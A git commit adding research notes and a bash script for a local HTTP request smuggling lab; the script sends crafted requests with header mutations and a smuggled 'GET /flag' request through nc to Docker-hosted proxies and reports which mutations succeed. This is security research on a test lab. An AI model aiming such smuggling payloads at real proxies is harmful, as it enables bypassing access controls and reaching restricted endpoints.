9a89db16fcf13c3cc8a1f6161f78bd011db54e7a
Tim Koopmans <koops@hey.com>
2021-01-08 11:05:06 +1100

    add research

---
+++ RESEARCH.md
@@ -0,0 +1,14 @@
+# HTTP Request Smuggling
+
+run the lab
+
+    cd labs/request-smuggling
+    docker-comppose up
+
+
+then test the target proxies by port
+
+    labs/request-smuggling/smuggle.sh 8001
+    💀 line-appendix-vtab
+    💀 colon-post-vtab
+
--- labs/request-smuggling/smuggle.sh
+++ labs/request-smuggling/smuggle.sh
@@ -1,3 +1,18 @@
+#!/usr/bin/env bash
+
+if [[ ${DEBUG-} =~ ^1|yes|true$ ]]; then
+  set -o xtrace
+fi
+set -o errtrace
+set -o nounset
+set -o pipefail
+
+if [ $# -eq 0 ]
+  then
+    echo "please run this with port number of target proxy 8001 - 8004"
+fi
+PORT=$1
+
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
 
 crlf () {
@@ -7,22 +22,22 @@ crlf () {
 request_builder () {
   {
     crlf "GET /hello HTTP/1.1"
-    crlf "Host: 0.0.0.0:8001"
+    crlf "Host: 0.0.0.0:${PORT}"
     crlf "Content-Length: 47"
     crlf "${1}"
     crlf ""
     crlf "0"
     crlf ""
     crlf "GET /flag HTTP/1.1"
-    crlf "Host: 0.0.0.0:8001"
+    crlf "Host: 0.0.0.0:${PORT}"
     crlf ""
     crlf "GET /hello HTTP/1.1"
-    crlf "Host: 0.0.0.0:8001"
+    crlf "Host: 0.0.0.0:${PORT}"
     crlf ""
   }
 }
 
 while IFS=, read -r name mutation
 do
-  request_builder "$mutation"| nc 0.0.0.0 8001 | grep --quiet deadbeef && printf "%s\n" "💀 $name"
+  request_builder "$mutation"| nc 0.0.0.0 ${PORT} | grep --quiet deadbeef && printf "%s\n" "💀 $name"
 done < "$DIR/mutations.csv"
